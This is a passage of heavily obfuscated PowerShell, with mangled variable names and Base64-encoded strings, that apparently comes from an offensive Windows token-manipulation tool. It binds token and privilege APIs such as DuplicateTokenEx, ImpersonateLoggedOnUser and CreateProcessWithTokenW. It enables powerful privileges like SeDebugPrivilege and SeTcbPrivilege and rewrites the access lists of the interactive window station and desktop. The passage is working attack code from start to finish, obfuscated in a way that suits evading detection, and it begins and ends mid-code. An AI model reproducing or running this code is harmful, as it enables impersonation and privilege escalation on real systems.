    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAGYASQBuAGgAZQByAGkAdABhAG4AYwBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AGUAZQA='))), ${__/\/\/\__/=\__/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${_/=\/\/=\__/====\} = ${/===\__/\_/\/==\/}.CreateType()
    ${/==\/=\/\/\__/\__} = __/\/\_/\____/\___ kernel32.dll OpenProcess
	${_/\/\/\_/\/\_/\__} = _________/=\_/\_/\ @([UInt32], [Bool], [UInt32]) ([IntPtr])
	${_/=\___/=\/=\___/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/==\/=\/\/\__/\__}, ${_/\/\/\_/\/\_/\__})
    ${__/=\_/==\/\_/=\/} = __/\/\_/\____/\___ advapi32.dll OpenProcessToken
	${__/=\_/\/==\/=\_/} = _________/=\_/\_/\ @([IntPtr], [UInt32], [IntPtr].MakeByRefType()) ([Bool])
	${___/=\_/=\/=\_/==} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${__/=\_/==\/\_/=\/}, ${__/=\_/\/==\/=\_/})    
    ${/==\/=\/\/\_/=\/=} = __/\/\_/\____/\___ advapi32.dll GetTokenInformation
	${/=\_/===\/\_/\___} = _________/=\_/\_/\ @([IntPtr], ${___/\/====\_/\_/=}, [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
	${___/\____/==\____} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/==\/=\/\/\_/=\/=}, ${/=\_/===\/\_/\___})    
    ${/=====\/====\/\/=} = __/\/\_/\____/\___ advapi32.dll SetThreadToken
	${____/\/=\/=\_/===} = _________/=\_/\_/\ @([IntPtr], [IntPtr]) ([Bool])
	${_/=\__/===\_/====} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/=====\/====\/\/=}, ${____/\/=\/=\_/===})    
    ${/=\/=\_/\/\/=\_/=} = __/\/\_/\____/\___ advapi32.dll ImpersonateLoggedOnUser
	${/==\/=\/\/=\__/\_} = _________/=\_/\_/\ @([IntPtr]) ([Bool])
	${__/\__/=\___/\_/\} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/=\/=\_/\/\/=\_/=}, ${/==\/=\/\/=\__/\_})
    ${_/====\___/\/=\__} = __/\/\_/\____/\___ advapi32.dll RevertToSelf
	${/==\/\_/\/\/=====} = _________/=\_/\_/\ @() ([Bool])
	${____/\/=\______/\} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/====\___/\/=\__}, ${/==\/\_/\/\/=====})
    ${_/\/=\/==\_/=\/\/} = __/\/\_/\____/\___ secur32.dll LsaGetLogonSessionData
	${______/===\__/\_/} = _________/=\_/\_/\ @([IntPtr], [IntPtr].MakeByRefType()) ([UInt32])
	${/=\_/\_/==\_____/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/\/=\/==\_/=\/\/}, ${______/===\__/\_/})
    ${/=\_/======\_/\/=} = __/\/\_/\____/\___ advapi32.dll CreateProcessWithTokenW
	${/=\_/===\____/=\/} = _________/=\_/\_/\ @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([Bool])
	${/=\/\/\/=\/\/=\/=} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/=\_/======\_/\/=}, ${/=\_/===\____/=\/})
    ${_/\_/\__/\_/=\/=\} = __/\/\_/\____/\___ msvcrt.dll memset
	${/====\/\_/\/=\_/=} = _________/=\_/\_/\ @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
	${__/=======\/=\/==} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/\_/\__/\_/=\/=\}, ${/====\/\_/\/=\_/=})
    ${___/======\_/=\__} = __/\/\_/\____/\___ advapi32.dll DuplicateTokenEx
	${__/==\/==\_/=\__/} = _________/=\_/\_/\ @([IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32], [IntPtr].MakeByRefType()) ([Bool])
	${__/=\/\/\/\/\/\/=} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${___/======\_/=\__}, ${__/==\/==\_/=\__/})
    ${__/=\/\/\___/\_/=} = __/\/\_/\____/\___ advapi32.dll LookupAccountSidW
	${_/=======\____/=\} = _________/=\_/\_/\ @([IntPtr], [IntPtr], [IntPtr], [UInt32].MakeByRefType(), [IntPtr], [UInt32].MakeByRefType(), [UInt32].MakeByRefType()) ([Bool])
	${/=\_/=\/=\___/\/\} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${__/=\/\/\___/\_/=}, ${_/=======\____/=\})
    ${_/\/\/\__/\/=\___} = __/\/\_/\____/\___ kernel32.dll CloseHandle
	${/==\/===\_/==\_/\} = _________/=\_/\_/\ @([IntPtr]) ([Bool])
	${/==\_/\/==\/==\__} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/\/\/\__/\/=\___}, ${/==\/===\_/==\_/\})
    ${/=\___/\/\/\/=\_/} = __/\/\_/\____/\___ secur32.dll LsaFreeReturnBuffer
	${___/\/==\/=\_/\__} = _________/=\_/\_/\ @([IntPtr]) ([UInt32])
	${___/\_/=\__/=\/=\} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/=\___/\/\/\/=\_/}, ${___/\/==\/=\_/\__})
    ${/=\__/\/=====\/==} = __/\/\_/\____/\___ kernel32.dll OpenThread
	${_/====\__/=\__/\_} = _________/=\_/\_/\ @([UInt32], [Bool], [UInt32]) ([IntPtr])
	${/\_____/\/=\_/\/\} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/=\__/\/=====\/==}, ${_/====\__/=\__/\_})
    ${__/========\/==\/} = __/\/\_/\____/\___ advapi32.dll OpenThreadToken
	${/==\/=\_/\_/====\} = _________/=\_/\_/\ @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
	${/==\_/\_/\__/\__/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${__/========\/==\/}, ${/==\/=\_/\_/====\})
    ${__/\_/\/=====\__/} = __/\/\_/\____/\___ advapi32.dll CreateProcessAsUserW
	${___/\__/\_/=\/=\_} = _________/=\_/\_/\ @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([Bool])
	${_/=\_/\/=\/\_/\__} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${__/\_/\/=====\__/}, ${___/\__/\_/=\/=\_})
    ${__/=\_/\/===\__/\} = __/\/\_/\____/\___ user32.dll OpenWindowStationW
    ${/=\_/=\_/\___/\/\} = _________/=\_/\_/\ @([IntPtr], [Bool], [UInt32]) ([IntPtr])
    ${/=\/\/\/\/\/\____} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${__/=\_/\/===\__/\}, ${/=\_/=\_/\___/\/\})
    ${_/=\/\/==\/===\/\} = __/\/\_/\____/\___ user32.dll OpenDesktopA
    ${/======\/==\/==\/} = _________/=\_/\_/\ @([String], [UInt32], [Bool], [UInt32]) ([IntPtr])
    ${_/=====\/\/\__/==} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/=\/\/==\/===\/\}, ${/======\/==\/==\/})
    ${/===\/=\/\___/=\/} = __/\/\_/\____/\___ Advapi32.dll ImpersonateSelf
    ${______/\/====\__/} = _________/=\_/\_/\ @([Int32]) ([Bool])
    ${_/\/\/=\/\/===\/\} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/===\/=\/\___/=\/}, ${______/\/====\__/})
    ${/=\/\____/=\/\/==} = __/\/\_/\____/\___ Advapi32.dll LookupPrivilegeValueA
    ${_/\/\_/====\/\/=\} = _________/=\_/\_/\ @([String], [String], ${/==\____/=\__/\__}.MakeByRefType()) ([Bool])
    ${___/\_____/===\/=} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/=\/\____/=\/\/==}, ${_/\/\_/====\/\/=\})
    ${_/===\/=\_/\__/\_} = __/\/\_/\____/\___ Advapi32.dll AdjustTokenPrivileges
    ${___/\/\__/\_/===\} = _________/=\_/\_/\ @([IntPtr], [Bool], ${/===\___/\/===\/=}.MakeByRefType(), [UInt32], [IntPtr], [IntPtr]) ([Bool])
    ${/==\/\/=\/===\/\/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/===\/=\_/\__/\_}, ${___/\/\__/\_/===\})
    ${__/=\/===\/==\_/=} = __/\/\_/\____/\___ kernel32.dll GetCurrentThread
    ${__/\___/\/\/=====} = _________/=\_/\_/\ @() ([IntPtr])
    ${/==\/=\_________/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${__/=\/===\/==\_/=}, ${__/\___/\/\/=====})
    ${______/==\/\_/===} = __/\/\_/\____/\___ advapi32.dll GetSecurityInfo
    ${/==\_/==\___/\/=\} = _________/=\_/\_/\ @([IntPtr], [UInt32], [UInt32], [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType()) ([UInt32])
    ${_/====\/\_/\/=\_/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${______/==\/\_/===}, ${/==\_/==\___/\/=\})
    ${__/\__/\/\___/\/=} = __/\/\_/\____/\___ advapi32.dll SetSecurityInfo
    ${_/=\/==\/====\___} = _________/=\_/\_/\ @([IntPtr], [UInt32], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([UInt32])
    ${/==\/==\/==\/\__/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${__/\__/\/\___/\/=}, ${_/=\/==\/====\___})
    ${__/=\/\_/\/\/\___} = __/\/\_/\____/\___ advapi32.dll GetAce
    ${_/=\_/===\/=\__/\} = _________/=\_/\_/\ @([IntPtr], [UInt32], [IntPtr].MakeByRefType()) ([IntPtr])
    ${____/\/=\/\___/\_} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${__/=\/\_/\/\/\___}, ${_/=\_/===\/=\__/\})
    ${__/=\/\/\___/\_/=} = __/\/\_/\____/\___ advapi32.dll LookupAccountSidW
    ${_/=======\____/=\} = _________/=\_/\_/\ @([IntPtr], [IntPtr], [IntPtr], [UInt32].MakeByRefType(), [IntPtr], [UInt32].MakeByRefType(), [UInt32].MakeByRefType()) ([Bool])
    ${/=\_/=\/=\___/\/\} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${__/=\/\/\___/\_/=}, ${_/=======\____/=\})
    ${___/==\/\/=\/==\_} = __/\/\_/\____/\___ advapi32.dll AddAccessAllowedAce
    ${_/=\/\/=\__/==\/\} = _________/=\_/\_/\ @([IntPtr], [UInt32], [UInt32], [IntPtr]) ([Bool])
    ${/====\/\_/\/==\__} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${___/==\/\/=\/==\_}, ${_/=\/\/=\__/==\/\})
    ${/=\/==\/=\_/=\_/\} = __/\/\_/\____/\___ advapi32.dll CreateWellKnownSid
    ${______/\/\/\/\_/=} = _________/=\_/\_/\ @([UInt32], [IntPtr], [IntPtr], [UInt32].MakeByRefType()) ([Bool])
    ${/=\/\/=\____/==\/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/=\/==\/=\_/=\_/\}, ${______/\/\/\/\_/=})
    ${______/\_/\_/\/\/} = __/\/\_/\____/\___ advapi32.dll SetEntriesInAclW
    ${__/\__/==\_/\__/\} = _________/=\_/\_/\ @([UInt32], ${_/=\/\/=\__/====\}.MakeByRefType(), [IntPtr], [IntPtr].MakeByRefType()) ([UInt32])
    ${__/==\/\__/===\/\} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${______/\_/\_/\/\/}, ${__/\__/==\_/\__/\})
    ${__/\_/\/\_/\/\/\/} = __/\/\_/\____/\___ kernel32.dll LocalFree
    ${___/==\/\_/\/\/\/} = _________/=\_/\_/\ @([IntPtr]) ([IntPtr])
    ${_____/===\____/\/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${__/\_/\/\_/\/\/\/}, ${___/==\/\_/\/\/\/})
    ${_______/=\_/\/=\/} = __/\/\_/\____/\___ advapi32.dll LookupPrivilegeNameW
    ${/=\/\/\/\_/==\__/} = _________/=\_/\_/\ @([IntPtr], [IntPtr], [IntPtr], [UInt32].MakeByRefType()) ([Bool])
    ${/=\_/=\_/\__/====} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_______/=\_/\/=\/}, ${/=\/\/\/\_/==\__/})
    Function _/==\/=\/\/\/=\__/
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		${___/\__/=====\__/\},
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		${______/\/\__/=\__/}
		)
		[Byte[]]${__/===\_/=\_/\_/\} = [BitConverter]::GetBytes(${___/\__/=====\__/\})
		[Byte[]]${____/==\_____/=\_} = [BitConverter]::GetBytes(${______/\/\__/=\__/})
		[Byte[]]${_/=\____/=\__/\_/} = [BitConverter]::GetBytes([UInt64]0)
		if (${__/===\_/=\_/\_/\}.Count -eq ${____/==\_____/=\_}.Count)
		{
			${/====\_/\/=\/=\_/} = 0
			for (${___/===\__/\_/\/\} = 0; ${___/===\__/\_/\/\} -lt ${__/===\_/=\_/\_/\}.Count; ${___/===\__/\_/\/\}++)
			{
				[UInt16]${__/\___/=\_______} = ${__/===\_/=\_/\_/\}[${___/===\__/\_/\/\}] + ${____/==\_____/=\_}[${___/===\__/\_/\/\}] + ${/====\_/\/=\/=\_/}
				${_/=\____/=\__/\_/}[${___/===\__/\_/\/\}] = ${__/\___/=\_______} -band 0x00FF
				if ((${__/\___/=\_______} -band 0xFF00) -eq 0x100)
				{
					${/====\_/\/=\/=\_/} = 1
				}
				else
				{
					${/====\_/\/=\/=\_/} = 0
				}
			}
		}
		else
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AbgBvAHQAIABhAGQAZAAgAGIAeQB0AGUAYQByAHIAYQB5AHMAIABvAGYAIABkAGkAZgBmAGUAcgBlAG4AdAAgAHMAaQB6AGUAcwA=')))
		}
		return [BitConverter]::ToInt64(${_/=\____/=\__/\_/}, 0)
	}
    function Enable-SeAssignPrimaryTokenPrivilege
    {	
	    [IntPtr]${_____/\/==\/\____} = ${/==\/=\_________/}.Invoke()
	    if (${_____/\/==\/\____} -eq [IntPtr]::Zero)
	    {
		    Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABnAGUAdAAgAHQAaABlACAAaABhAG4AZABsAGUAIAB0AG8AIAB0AGgAZQAgAGMAdQByAHIAZQBuAHQAIAB0AGgAcgBlAGEAZAA=')))
	    }
	    [IntPtr]${___/=\/\/==\/\/=\} = [IntPtr]::Zero
	    [Bool]${_/==\_/=====\____} = ${/==\_/\_/\__/\__/}.Invoke(${_____/\/==\/\____}, ${__/==\/==\/\_/=\_}.TOKEN_QUERY -bor ${__/==\/==\/\_/=\_}.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]${___/=\/\/==\/\/=\})
        ${/\____/\_____/=\_} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
	    if (${_/==\_/=====\____} -eq $false)
	    {
		    if (${/\____/\_____/=\_} -eq ${__/==\/==\/\_/=\_}.ERROR_NO_TOKEN)
		    {
			    ${_/==\_/=====\____} = ${_/\/\/=\/\/===\/\}.Invoke(${__/==\/==\/\_/=\_}.SECURITY_DELEGATION)
			    if (${_/==\_/=====\____} -eq $false)
			    {
				    Throw (New-Object ComponentModel.Win32Exception)
			    }
			    ${_/==\_/=====\____} = ${/==\_/\_/\__/\__/}.Invoke(${_____/\/==\/\____}, ${__/==\/==\/\_/=\_}.TOKEN_QUERY -bor ${__/==\/==\/\_/=\_}.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]${___/=\/\/==\/\/=\})
			    if (${_/==\_/=====\____} -eq $false)
			    {
				    Throw (New-Object ComponentModel.Win32Exception)
			    }
		    }
		    else
		    {
			    Throw ([ComponentModel.Win32Exception] ${/\____/\_____/=\_})
		    }
	    }
        ${/==\_/\/==\/==\__}.Invoke(${_____/\/==\/\____}) | Out-Null
        ${__/=\/\/\_/\/====} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]${/==\____/=\__/\__})
        ${/=\/\/\/=\_/\/=\/} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${__/=\/\/\_/\/====})
        ${__/\_/\/==\___/==} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${/=\/\/\/=\_/\/=\/}, [Type]${/==\____/=\__/\__})
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${/=\/\/\/=\_/\/=\/})
	    ${_/==\_/=====\____} = ${___/\_____/===\/=}.Invoke($null, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAEEAcwBzAGkAZwBuAFAAcgBpAG0AYQByAHkAVABvAGsAZQBuAFAAcgBpAHYAaQBsAGUAZwBlAA=='))), [Ref] ${__/\_/\/==\___/==})
	    if (${_/==\_/=====\____} -eq $false)
	    {
		    Throw (New-Object ComponentModel.Win32Exception)
	    }
        [UInt32]${_/=\_____/\_/=\__} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]${___/==\_/=\_/====})
        ${___/\/=\/\/\/\/==} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${_/=\_____/\_/=\__})
        ${/==\_/\_/====\___} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${___/\/=\/\/\/\/==}, [Type]${___/==\_/=\_/====})
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${___/\/=\/\/\/\/==})
        ${/==\_/\_/====\___}.Luid = ${__/\_/\/==\___/==}
        ${/==\_/\_/====\___}.Attributes = ${__/==\/==\/\_/=\_}.SE_PRIVILEGE_ENABLED
        [UInt32]${__/\/\_/\/===\/=\} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]${/===\___/\/===\/=})
        ${_____/\/\/\/=====} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${__/\/\_/\/===\/=\})
        ${____/\/\/\/\/=\_/} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${_____/\/\/\/=====}, [Type]${/===\___/\/===\/=})
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${_____/\/\/\/=====})
	    ${____/\/\/\/\/=\_/}.PrivilegeCount = 1
	    ${____/\/\/\/\/=\_/}.Privileges = ${/==\_/\_/====\___}
        ${Global:/=\/=\__/==\__/\_} = ${____/\/\/\/\/=\_/}
	    ${_/==\_/=====\____} = ${/==\/\/=\/===\/\/}.Invoke(${___/=\/\/==\/\/=\}, $false, [Ref] ${____/\/\/\/\/=\_/}, ${__/\/\_/\/===\/=\}, [IntPtr]::Zero, [IntPtr]::Zero)
	    if (${_/==\_/=====\____} -eq $false)
	    {
            Throw (New-Object ComponentModel.Win32Exception)
	    }
        ${/==\_/\/==\/==\__}.Invoke(${___/=\/\/==\/\/=\}) | Out-Null
    }
    function _/=\_/\/=\/\/=====
    {
        Param(
            [Parameter()]
            [ValidateSet("SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeBackupPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege",
                "SeCreatePagefilePrivilege", "SeCreatePermanentPrivilege", "SeCreateSymbolicLinkPrivilege", "SeCreateTokenPrivilege",
                "SeDebugPrivilege", "SeEnableDelegationPrivilege", "SeImpersonatePrivilege", "SeIncreaseBasePriorityPrivilege",
                "SeIncreaseQuotaPrivilege", "SeIncreaseWorkingSetPrivilege", "SeLoadDriverPrivilege", "SeLockMemoryPrivilege", "SeMachineAccountPrivilege",
                "SeManageVolumePrivilege", "SeProfileSingleProcessPrivilege", "SeRelabelPrivilege", "SeRemoteShutdownPrivilege", "SeRestorePrivilege",
                "SeSecurityPrivilege", "SeShutdownPrivilege", "SeSyncAgentPrivilege", "SeSystemEnvironmentPrivilege", "SeSystemProfilePrivilege",
                "SeSystemtimePrivilege", "SeTakeOwnershipPrivilege", "SeTcbPrivilege", "SeTimeZonePrivilege", "SeTrustedCredManAccessPrivilege",
                "SeUndockPrivilege", "SeUnsolicitedInputPrivilege")]
            [String]
            ${____/\_/\___/==\_/}
        )
	    [IntPtr]${_____/\/==\/\____} = ${/==\/=\_________/}.Invoke()
	    if (${_____/\/==\/\____} -eq [IntPtr]::Zero)
	    {
		    Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABnAGUAdAAgAHQAaABlACAAaABhAG4AZABsAGUAIAB0AG8AIAB0AGgAZQAgAGMAdQByAHIAZQBuAHQAIAB0AGgAcgBlAGEAZAA=')))
	    }
	    [IntPtr]${___/=\/\/==\/\/=\} = [IntPtr]::Zero
	    [Bool]${_/==\_/=====\____} = ${/==\_/\_/\__/\__/}.Invoke(${_____/\/==\/\____}, ${__/==\/==\/\_/=\_}.TOKEN_QUERY -bor ${__/==\/==\/\_/=\_}.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]${___/=\/\/==\/\/=\})
        ${/\____/\_____/=\_} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
	    if (${_/==\_/=====\____} -eq $false)
	    {
		    if (${/\____/\_____/=\_} -eq ${__/==\/==\/\_/=\_}.ERROR_NO_TOKEN)
		    {
			    ${_/==\_/=====\____} = ${_/\/\/=\/\/===\/\}.Invoke(${__/==\/==\/\_/=\_}.SECURITY_DELEGATION)
			    if (${_/==\_/=====\____} -eq $false)
			    {
				    Throw (New-Object ComponentModel.Win32Exception)
			    }
			    ${_/==\_/=====\____} = ${/==\_/\_/\__/\__/}.Invoke(${_____/\/==\/\____}, ${__/==\/==\/\_/=\_}.TOKEN_QUERY -bor ${__/==\/==\/\_/=\_}.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]${___/=\/\/==\/\/=\})
			    if (${_/==\_/=====\____} -eq $false)
			    {
				    Throw (New-Object ComponentModel.Win32Exception)
			    }
		    }
		    else
		    {
			    Throw ([ComponentModel.Win32Exception] ${/\____/\_____/=\_})
		    }
	    }
        ${/==\_/\/==\/==\__}.Invoke(${_____/\/==\/\____}) | Out-Null
        ${__/=\/\/\_/\/====} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]${/==\____/=\__/\__})
        ${/=\/\/\/=\_/\/=\/} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${__/=\/\/\_/\/====})
        ${__/\_/\/==\___/==} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${/=\/\/\/=\_/\/=\/}, [Type]${/==\____/=\__/\__})
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${/=\/\/\/=\_/\/=\/})
	    ${_/==\_/=====\____} = ${___/\_____/===\/=}.Invoke($null, ${____/\_/\___/==\_/}, [Ref] ${__/\_/\/==\___/==})
	    if (${_/==\_/=====\____} -eq $false)
	    {
		    Throw (New-Object ComponentModel.Win32Exception)
	    }
        [UInt32]${_/=\_____/\_/=\__} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]${___/==\_/=\_/====})
        ${___/\/=\/\/\/\/==} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${_/=\_____/\_/=\__})
        ${/==\_/\_/====\___} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${___/\/=\/\/\/\/==}, [Type]${___/==\_/=\_/====})
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${___/\/=\/\/\/\/==})
        ${/==\_/\_/====\___}.Luid = ${__/\_/\/==\___/==}
        ${/==\_/\_/====\___}.Attributes = ${__/==\/==\/\_/=\_}.SE_PRIVILEGE_ENABLED
        [UInt32]${__/\/\_/\/===\/=\} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]${/===\___/\/===\/=})
        ${_____/\/\/\/=====} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${__/\/\_/\/===\/=\})
        ${____/\/\/\/\/=\_/} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${_____/\/\/\/=====}, [Type]${/===\___/\/===\/=})
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${_____/\/\/\/=====})
	    ${____/\/\/\/\/=\_/}.PrivilegeCount = 1
	    ${____/\/\/\/\/=\_/}.Privileges = ${/==\_/\_/====\___}
        ${Global:/=\/=\__/==\__/\_} = ${____/\/\/\/\/=\_/}
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB0AHQAZQBtAHAAdABpAG4AZwAgAHQAbwAgAGUAbgBhAGIAbABlACAAcAByAGkAdgBpAGwAZQBnAGUAOgAgACQAewBfAF8AXwBfAC8AXABfAC8AXABfAF8AXwAvAD0APQBcAF8ALwB9AA==')))
	    ${_/==\_/=====\____} = ${/==\/\/=\/===\/\/}.Invoke(${___/=\/\/==\/\/=\}, $false, [Ref] ${____/\/\/\/\/=\_/}, ${__/\/\_/\/===\/=\}, [IntPtr]::Zero, [IntPtr]::Zero)
	    if (${_/==\_/=====\____} -eq $false)
	    {
            Throw (New-Object ComponentModel.Win32Exception)
	    }
        ${/==\_/\/==\/==\__}.Invoke(${___/=\/\/==\/\/=\}) | Out-Null
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAGEAYgBsAGUAZAAgAHAAcgBpAHYAaQBsAGUAZwBlADoAIAAkAHsAXwBfAF8AXwAvAFwAXwAvAFwAXwBfAF8ALwA9AD0AXABfAC8AfQA=')))
    }
    function _/==\_/=====\/\_/\
    {
        _/=\_/\/=\/\/===== -____/\_/\___/==\_/ SeSecurityPrivilege
        ${__/\/\__/\/=\/\/\} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AUwB0AGEAMAA='))))
        ${____/=====\/\__/=} = ${/=\/\/\/\/\/\____}.Invoke(${__/\/\__/\/=\/\/\}, $false, ${__/==\/==\/\_/=\_}.ACCESS_SYSTEM_SECURITY -bor ${__/==\/==\/\_/=\_}.READ_CONTROL -bor ${__/==\/==\/\_/=\_}.WRITE_DAC)
        if (${____/=====\/\__/=} -eq [IntPtr]::Zero)
        {
            Throw (New-Object ComponentModel.Win32Exception)
        }
        _/===\____/=\/=\/\ -__/=\/=\__/=\___/\ ${____/=====\/\__/=}
        ${/==\_/\/==\/==\__}.Invoke(${____/=====\/\__/=}) | Out-Null
        ${_/\/\/\/\_/=\/===} = ${_/=====\/\/\__/==}.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABlAGYAYQB1AGwAdAA='))), 0, $false, ${__/==\/==\/\_/=\_}.DESKTOP_GENERIC_ALL -bor ${__/==\/==\/\_/=\_}.WRITE_DAC)
        if (${_/\/\/\/\_/=\/===} -eq [IntPtr]::Zero)
        {
            Throw (New-Object ComponentModel.Win32Exception)
        }
        _/===\____/=\/=\/\ -__/=\/=\__/=\___/\ ${_/\/\/\/\_/=\/===}
        ${/==\_/\/==\/==\__}.Invoke(${_/\/\/\/\_/=\/===}) | Out-Null
    }
    function _/===\____/=\/=\/\
    {
        Param(
            [IntPtr]${__/=\/=\__/=\___/\}
            )
        [IntPtr]${/==\____/=\/\/=\_} = [IntPtr]::Zero
        [IntPtr]${/==\__/\/=\/\_/\_} = [IntPtr]::Zero
        [IntPtr]${___/=\/=\/=\/\___} = [IntPtr]::Zero
        [IntPtr]${_/\___/=\__/\/==\} = [IntPtr]::Zero
        [IntPtr]${/\_____/=\/==\/\/} = [IntPtr]::Zero
        ${/====\_/==\__/\/\} = ${_/====\/\_/\/=\_/}.Invoke(${__/=\/=\__/=\___/\}, 0x7, ${__/==\/==\/\_/=\_}.DACL_SECURITY_INFORMATION, [Ref]${/==\____/=\/\/=\_}, [Ref]${/==\__/\/=\/\_/\_}, [Ref]${___/=\/=\/=\/\___}, [Ref]${_/\___/=\__/\/==\}, [Ref]${/\_____/=\/==\/\/})
        if (${/====\_/==\__/\/\} -ne 0)
        {
            Write-Error $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABjAGEAbABsACAARwBlAHQAUwBlAGMAdQByAGkAdAB5AEkAbgBmAG8ALgAgAEUAcgByAG8AcgBDAG8AZABlADoAIAAkAHsALwA9AD0APQA9AFwAXwAvAD0APQBcAF8AXwAvAFwALwBcAH0A')))
        }
        if (${___/=\/=\/=\/\___} -ne [IntPtr]::Zero)
        {
            ${/==\/\/==\____/\/} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${___/=\/=\/=\/\___}, [Type]${_/===\__/\_/\/\/\})
            [UInt32]${__/=\_/\_/\_/\___} = 2000
